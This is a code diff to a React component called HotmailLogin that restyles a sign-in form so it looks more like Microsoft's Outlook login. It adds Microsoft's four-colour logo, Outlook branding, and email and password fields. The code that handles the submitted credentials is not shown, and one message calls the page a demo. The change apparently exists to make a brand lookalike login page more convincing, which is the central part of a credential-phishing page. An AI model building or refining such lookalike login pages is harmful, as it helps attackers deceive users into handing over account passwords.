@@ -87,13 +87,19 @@ export default function HotmailLogin() {
   }
 
   return (
-    <div className="min-h-screen bg-[#eef2f7] flex items-center justify-center px-4 py-10">
-      <div className="w-full max-w-sm rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] overflow-hidden">
-        <div className="px-6 py-10 sm:px-8 sm:py-12">
-          <div className="flex flex-col items-center gap-2">
-            <img src={emailLogo} alt="Hotmail" className="h-14 w-14" />
-            <h1 className="text-3xl font-semibold text-slate-900">Outlook</h1>
-            <p className="text-sm text-slate-500">Sign in to continue</p>
+    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
+      <div className="w-full max-w-[360px] rounded-[34px] bg-white border border-slate-200 shadow-[0_25px_60px_rgba(15,23,42,0.12)] overflow-hidden">
+        <div className="px-8 py-10">
+          <div className="mx-auto mb-7 grid h-14 w-14 grid-cols-2 gap-1">
+            <div className="rounded-sm bg-[#f25022]" />
+            <div className="rounded-sm bg-[#7fba00]" />
+            <div className="rounded-sm bg-[#00a4ef]" />
+            <div className="rounded-sm bg-[#ffb900]" />
+          </div>
+
+          <div className="text-center">
+            <h1 className="text-4xl font-semibold text-slate-950">Outlook</h1>
+            <p className="mt-2 text-base text-slate-500">Sign in to continue</p>
           </div>
 
           <form onSubmit={handleSubmit} className="mt-8 space-y-4">
@@ -102,7 +108,7 @@ export default function HotmailLogin() {
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               placeholder="Email, phone, or Skype"
-              className="w-full rounded-[18px] border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
+              className="w-full rounded-2xl border border-slate-300 bg-white px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
             />
 
             <input
@@ -110,13 +116,25 @@ export default function HotmailLogin() {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="Password"
-              className="w-full rounded-[18px] border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
+              className="w-full rounded-2xl border border-slate-300 bg-white px-4 py-4 text-slate-900 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
             />
+
+            <div className="flex items-center justify-between text-sm text-slate-500">
+              <p>No account?{' '}
+                <button
+                  type="button"
+                  className="text-blue-600 hover:underline"
+                  onClick={() => window.location.href = "/"}
+                >
+                  Create one!
+                </button>
+              </p>
+            </div>
 
             <button
               type="submit"
               disabled={loading}
-              className="w-full rounded-[18px] bg-blue-600 px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
+              className="w-full rounded-2xl bg-[#0067c5] px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-[#0052a5] disabled:cursor-not-allowed disabled:opacity-60"
             >
               {loading ? "Signing in..." : "Sign in"}
             </button>
@@ -127,23 +145,15 @@ export default function HotmailLogin() {
                 type="checkbox"
                 className="h-4 w-4 rounded border-slate-300 text-blue-600 focus:ring-blue-500"
               />
-              <label htmlFor="remember-hotmail">Keep me signed in</label>
+              <label htmlFor="remember-hotmail" className="text-slate-700">
+                Keep me signed in
+              </label>
             </div>
 
-            <div className="text-sm text-slate-600">
-              No account?{' '}
+            <div className="text-sm">
               <button
                 type="button"
                 className="text-blue-600 hover:underline"
-                onClick={() => window.location.href = "/"}
-              >
-                Create one!
-              </button>
-            </div>
-
-            <div className="text-sm text-blue-600 hover:underline">
-              <button
-                type="button"
                 onClick={() => alert("Password recovery is not available in this demo.")}
               >
                 Can't access your account?
